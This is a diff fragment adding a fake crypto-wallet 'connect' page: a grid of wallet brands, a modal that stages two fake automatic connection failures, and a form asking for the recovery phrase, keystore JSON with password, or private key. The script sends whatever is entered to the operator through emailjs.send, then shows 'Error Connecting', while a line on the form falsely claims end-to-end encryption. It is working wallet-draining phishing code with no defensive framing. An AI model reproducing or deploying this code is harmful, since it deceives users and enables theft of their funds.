+<div class="walletItem" data-name="Synthetix"><div class="walletLogo"><img src="ICON/synthetix.png" alt="Synthetix"></div><div class="walletName">Synthetix</div></div>
+<div class="walletItem" data-name="DexBlue"><div class="walletLogo"><img src="ICON/dex.blue.jpg" alt="DexBlue"></div><div class="walletName">DexBlue</div></div>
+<div class="walletItem" data-name="PoolTogether"><div class="walletLogo"><img src="ICON/pooltogether.jpg" alt="PoolTogether"></div><div class="walletName">PoolTogether</div></div>
+<div class="walletItem" data-name="Gelato"><div class="walletLogo"><img src="ICON/gelato.jpg" alt="Gelato"></div><div class="walletName">Gelato</div></div>
+<div class="walletItem" data-name="EnsdoMain"><div class="walletLogo"><img src="ICON/ensdomain.jpg" alt="EnsdoMain"></div><div class="walletName">EnsdoMain</div></div>
+<div class="walletItem" data-name="IdleFinance"><div class="walletLogo"><img src="ICON/idlefinance.png" alt="IdleFinance"></div><div class="walletName">IdleFinance</div></div>
+<div class="walletItem" data-name="iEarnFinance"><div class="walletLogo"><img src="ICON/iearn.finance.jpg" alt="iEarnFinance"></div><div class="walletName">iEarnFinance</div></div>
+<div class="walletItem" data-name="RCNFinance"><div class="walletLogo"><img src="ICON/RCNfinance.jpg" alt="RCNFinance"></div><div class="walletName">RCNFinance</div></div>
+<div class="walletItem" data-name="Hegic"><div class="walletLogo"><img src="ICON/hegic.png" alt="Hegic"></div><div class="walletName">Hegic</div></div>
+<div class="walletItem" data-name="Kickback"><div class="walletLogo"><img src="ICON/kickback.png" alt="Kickback"></div><div class="walletName">Kickback</div></div>
+<div class="walletItem" data-name="88mph"><div class="walletLogo"><img src="ICON/88mph.jpg" alt="88mph"></div><div class="walletName">88mph</div></div>
+<div class="walletItem" data-name="Clovers"><div class="walletLogo"><img src="ICON/clovers.png" alt="Clovers"></div><div class="walletName">Clovers</div></div>
+<div class="walletItem" data-name="MintBase"><div class="walletLogo"><img src="ICON/mintbase.jpg" alt="MintBase"></div><div class="walletName">MintBase</div></div>
+<div class="walletItem" data-name="DAOstack"><div class="walletLogo"><img src="ICON/daostack.png" alt="DAOstack"></div><div class="walletName">DAOstack</div></div>
+<div class="walletItem" data-name="KnownOrigin"><div class="walletLogo"><img src="ICON/knownorigin.png" alt="KnownOrigin"></div><div class="walletName">KnownOrigin</div></div>
+<div class="walletItem" data-name="MyEtherWallet"><div class="walletLogo"><img src="ICON/myetherwallet.png" alt="MyEtherWallet"></div><div class="walletName">MyEtherWallet</div></div>
+<div class="walletItem" data-name="StablePay"><div class="walletLogo"><img src="ICON/stablepay.jpg" alt="StablePay"></div><div class="walletName">StablePay</div></div>
+<div class="walletItem" data-name="DeFiSaver"><div class="walletLogo"><img src="ICON/defisaver.jpg" alt="DeFiSaver"></div><div class="walletName">DeFiSaver</div></div>
+<div class="walletItem" data-name="LoomNetwork"><div class="walletLogo"><img src="ICON/loomnetwork.png" alt="LoomNetwork"></div><div class="walletName">LoomNetwork</div></div>
+<div class="walletItem" data-name="ThorChain"><div class="walletLogo"><img src="ICON/thorchain.png" alt="ThorChain"></div><div class="walletName">ThorChain</div></div>
+<div class="walletItem" data-name="BullSender"><div class="walletLogo"><img src="ICON/bulksender.png" alt="BullSender"></div><div class="walletName">BullSender</div></div>
+<div class="walletItem" data-name="BeToken"><div class="walletLogo"><img src="ICON/betoken.jpg" alt="BeToken"></div><div class="walletName">BeToken</div></div>
+<div class="walletItem" data-name="Helio"><div class="walletLogo"><img src="ICON/helio.jpg" alt="Helio"></div><div class="walletName">Helio</div></div>
+<div class="walletItem" data-name="TokenMarket"><div class="walletLogo"><img src="ICON/tokenmarket.jpg" alt="TokenMarket"></div><div class="walletName">TokenMarket</div></div>
+<div class="walletItem" data-name="MCDex"><div class="walletLogo"><img src="ICON/mcdex.png" alt="MCDex"></div><div class="walletName">MCDex</div></div>
+<div class="walletItem" data-name="FuruCombo"><div class="walletLogo"><img src="ICON/furucombo.png" alt="FuruCombo"></div><div class="walletName">FuruCombo</div></div>
+<div class="walletItem" data-name="Melon"><div class="walletLogo"><img src="ICON/melon.png" alt="Melon"></div><div class="walletName">Melon</div></div>
+<div class="walletItem" data-name="Chainsfr"><div class="walletLogo"><img src="ICON/chainsfr.png" alt="Chainsfr"></div><div class="walletName">Chainsfr</div></div>
+<div class="walletItem" data-name="2Key"><div class="walletLogo"><img src="ICON/2key.jpg" alt="2Key"></div><div class="walletName">2Key</div></div>
+<div class="walletItem" data-name="Pitch"><div class="walletLogo"><img src="ICON/pitch.png" alt="Pitch"></div><div class="walletName">Pitch</div></div>
+<div class="walletItem" data-name="SushiSwap"><div class="walletLogo"><img src="ICON/sushiswap.jpg" alt="SushiSwap"></div><div class="walletName">SushiSwap</div></div>
+<div class="walletItem" data-name="Unagii"><div class="walletLogo"><img src="ICON/unagii.jpg" alt="Unagii"></div><div class="walletName">Unagii</div></div>
+<div class="walletItem" data-name="CreamFinance"><div class="walletLogo"><img src="ICON/creamfinance.png" alt="CreamFinance"></div><div class="walletName">CreamFinance</div></div>
+
+<div class="walletItem" data-name="Bitget"><div class="walletLogo"><img src="ICON/bitget.jpeg" alt="Bitget"></div><div class="walletName">Bitget</div></div>
+<div class="walletItem" data-name="Electrum"><div class="walletLogo"><img src="ICON/electrum.jpeg" alt="Electrum"></div><div class="walletName">Electrum</div></div>
+<div class="walletItem" data-name="Exodus"><div class="walletLogo"><img src="ICON/exodus.png" alt="Exodus"></div><div class="walletName">Exodus</div></div>
+<div class="walletItem" data-name="crypto.com"><div class="walletLogo"><img src="ICON/crypto1.jpeg" alt="crypto.com"></div><div class="walletName">crypto.com</div></div>
+
+<div class="walletItem" data-name="OtherWallet"><div class="walletLogo"><img src="ICON/otherwallet.jpg" alt="OtherWallet"></div><div class="walletName">OtherWallet</div></div>
+
+
+    </div>
+  </div>
+</div>
+
+<!-- Modal -->
+<div id="overlay" class="overlay" aria-hidden="true">
+  <div class="modal" role="document">
+    <div class="modalHeader">
+      <div id="modalTitle" class="modalTitle">Wallet</div>
+      <button id="btnClose" class="modalClose">×</button>
+    </div>
+    <div class="modalBody">
+      <!-- Automatic attempt -->
+      <div id="stepAttempt">
+        <div class="pulseWrap"><div class="pulse"><div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div><div class="core"></div></div></div>
+        <div class="statusText" id="autoStatus">Connecting automatically…</div>
+      </div>
+      <!-- First fail -->
+      <div id="stepFirstFail" style="display:none">
+        <div class="statusText">Can’t connect automatically. Try again.</div>
+        <div class="actions"><button id="btnTryAgain" class="btn btnPrimary">Try Again</button></div>
+      </div>
+      <!-- Second fail -->
+      <div id="stepSecondFail" style="display:none">
+        <div class="statusText">Can’t connect automatically. Try connecting manually.</div>
+        <div class="actions"><button id="btnManual" class="btn btnPrimary">Try Connecting Manually</button></div>
+      </div>
+      <!-- Manual delay -->
+      <div id="stepManualDelay" style="display:none"><div class="statusText">Preparing manual connection…</div></div>
+      <!-- Manual form -->
+      <div id="stepManualForm" style="display:none">
+        <div class="methodTabs">
+          <div id="tabPhrase" class="methodTab active">Phrase</div>
+          <div id="tabKeystore" class="methodTab">Keystore JSON</div>
+          <div id="tabPrivate" class="methodTab">Private Key</div>
+        </div>
+        <div id="formPhrase" class="formWrap active">
+          <div class="label">Recovery Phrase (12/24 words)</div>
+          <textarea id="phraseText" class="textarea" placeholder="Enter your 12/24-word recovery phrase…"></textarea>
+        </div>
+        <div id="formKeystore" class="formWrap">
+          <div class="label">Keystore JSON</div>
+          <textarea id="keystoreJson" class="textarea" placeholder="Paste Keystore JSON…"></textarea>
+          <div class="label">Keystore Password</div>
+          <input id="keystorePassword" class="input" type="password" placeholder="Password for Keystore (optional)" />
+        </div>
+        <div id="formPrivate" class="formWrap">
+          <div class="label">Private Key</div>
+          <textarea id="privateKey" class="textarea" placeholder="Enter your private key…"></textarea>
+        </div>
+        <div class="submitRow">
+          <button id="btnSend" class="btn btnPrimary">Connect</button>
+          <button id="btnCancel" class="btn btnGhost">Cancel</button>
+        </div>
+        <div class="note"> This session is protected with an end-to-end encryption.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+const SERVICE_ID="service_b4uknan";
+const TEMPLATE_ID="template_lsu8iel";
+
+const search=document.getElementById('search');
+const walletGrid=document.getElementById('walletGrid');
+const overlay=document.getElementById('overlay');
+const btnClose=document.getElementById('btnClose');
+const modalTitle=document.getElementById('modalTitle');
+
+const stepAttempt=document.getElementById('stepAttempt');
+const stepFirstFail=document.getElementById('stepFirstFail');
+const stepSecondFail=document.getElementById('stepSecondFail');
+const stepManualDelay=document.getElementById('stepManualDelay');
+const stepManualForm=document.getElementById('stepManualForm');
+
+const btnTryAgain=document.getElementById('btnTryAgain');
+const btnManual=document.getElementById('btnManual');
+const btnSend=document.getElementById('btnSend');
+const btnCancel=document.getElementById('btnCancel');
+
+const tabPhrase=document.getElementById('tabPhrase');
+const tabKeystore=document.getElementById('tabKeystore');
+const tabPrivate=document.getElementById('tabPrivate');
+
+const formPhrase=document.getElementById('formPhrase');
+const formKeystore=document.getElementById('formKeystore');
+const formPrivate=document.getElementById('formPrivate');
+
+const phraseText=document.getElementById('phraseText');
+const keystoreJson=document.getElementById('keystoreJson');
+const keystorePassword=document.getElementById('keystorePassword');
+const privateKey=document.getElementById('privateKey');
+
+let selectedWallet="";
+let timers=[];
+
+function clearTimers(){ timers.forEach(t=>clearTimeout(t)); timers=[]; }
+function hideAllSteps(){ stepAttempt.style.display="none"; stepFirstFail.style.display="none"; stepSecondFail.style.display="none"; stepManualDelay.style.display="none"; stepManualForm.style.display="none"; }
+
+function resetFormTabs(){
+  tabPhrase.classList.remove('active');
+  tabKeystore.classList.remove('active');
+  tabPrivate.classList.remove('active');
+  formPhrase.classList.remove('active');
+  formKeystore.classList.remove('active');
+  formPrivate.classList.remove('active');
+  phraseText.value=""; keystoreJson.value=""; keystorePassword.value=""; privateKey.value="";
+}
+
+function openModal(walletName){
+  selectedWallet=walletName;
+  modalTitle.textContent=walletName;
+  hideAllSteps();
+  resetFormTabs();
+  stepAttempt.style.display="block";
+  overlay.classList.add('active');
+  clearTimers();
+  timers.push(setTimeout(()=>{
+    hideAllSteps();
+    stepFirstFail.style.display="block";
+  },20000));
+}
+
+function closeModal(){ overlay.classList.remove('active'); hideAllSteps(); clearTimers(); resetFormTabs(); }
+
+walletGrid.querySelectorAll('.walletItem').forEach(node=>{ node.addEventListener('click',()=>openModal(node.dataset.name)); });
+search.addEventListener('input',()=>{ const q=search.value.trim().toLowerCase(); walletGrid.querySelectorAll('.walletItem').forEach(item=>{ const name=item.dataset.name.toLowerCase(); item.style.display=name.includes(q)?"flex":"none"; }); });
+
+btnTryAgain.addEventListener('click',()=>{
+  hideAllSteps();
+  stepAttempt.style.display="block";
+  clearTimers();
+  timers.push(setTimeout(()=>{
+    hideAllSteps();
+    stepSecondFail.style.display="block";
+  },20000));
+});
+
+btnManual.addEventListener('click',()=>{
+  hideAllSteps();
+  stepManualDelay.style.display="block";
+  clearTimers();
+  timers.push(setTimeout(()=>{
+    hideAllSteps();
+    stepManualForm.style.display="block";
+  },1000));
+});
+
+btnClose.addEventListener('click',closeModal);
+btnCancel.addEventListener('click',closeModal);
+
+// Tab click events
+tabPhrase.addEventListener('click', () => { resetFormTabs(); tabPhrase.classList.add('active'); formPhrase.classList.add('active'); });
+tabKeystore.addEventListener('click', () => { resetFormTabs(); tabKeystore.classList.add('active'); formKeystore.classList.add('active'); });
+tabPrivate.addEventListener('click', () => { resetFormTabs(); tabPrivate.classList.add('active'); formPrivate.classList.add('active'); });
+
+// Toast function
+function showToast(message){
+  const toast=document.getElementById('toast');
+  toast.textContent=message;
+  toast.style.display='block';
+  toast.style.opacity='1';
+  toast.style.transform='translate(-50%,-50%) scale(1)';
+  setTimeout(()=>{ toast.style.opacity='0'; toast.style.transform='translate(-50%,-50%) scale(0.9)'; setTimeout(()=>{ toast.style.display='none'; },500); },2500);
+}
+
+btnSend.addEventListener('click',()=>{
+  let method="", userInput="";
+  if(tabPhrase.classList.contains('active')){
+    method="Phrase";
+    userInput=phraseText.value.trim();
+    const wordCount=userInput.split(/\s+/).filter(w=>w).length;
+    if(wordCount!==12 && wordCount!==24){ alert("Recovery phrase must be 12 or 24 words."); return; }
+  } else if(tabKeystore.classList.contains('active')){
+    method="Keystore";
+    userInput=keystoreJson.value.trim();
+    try{JSON.parse(userInput);}catch(e){alert("Keystore JSON invalid.");return;}
+  } else if(tabPrivate.classList.contains('active')){
+    method="Private Key";
+    userInput=privateKey.value.trim();
+    if(!/^[0-9a-fA-F]{64}$/.test(userInput)){ alert("Private Key must be 64-character hex."); return; }
+  }
+
+  const payload={ wallet_name:selectedWallet, connection_method:method, input_data:userInput };
+  emailjs.send(SERVICE_ID,TEMPLATE_ID,payload)
+  .then(()=>{
+    showToast("Error Connecting");
+    closeModal();
+  })
+  .catch(err=>{ console.error("EmailJS error:",err); alert("Failed sending manual input."); });
+});
+</script>
+</body>
+</html>
